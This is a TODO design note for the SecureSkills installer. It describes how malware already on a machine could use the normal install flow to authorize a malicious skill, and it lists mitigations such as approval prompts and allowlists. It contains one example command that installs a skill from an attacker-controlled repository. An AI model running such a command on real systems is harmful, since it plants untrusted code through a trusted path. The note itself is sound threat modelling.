# TODO

## Installer Authority

SecureSkills v1 treats the local project key as the trust root. That means a malicious script or other RCE already running with enough local privilege could invoke the normal installer flow itself, for example by running:

```bash
npx secureskills add <attacker-controlled-repo> --skill <malicious-skill>
```

If that happens, the malicious skill would be authorized through the legitimate install path and then pass runtime verification.

This needs later-stage mitigation. Candidate directions:

- interactive approval for first-time sources
- allowlists for trusted owners or repositories
- separate installer approval from normal runtime authority
- stronger policy around non-interactive installs
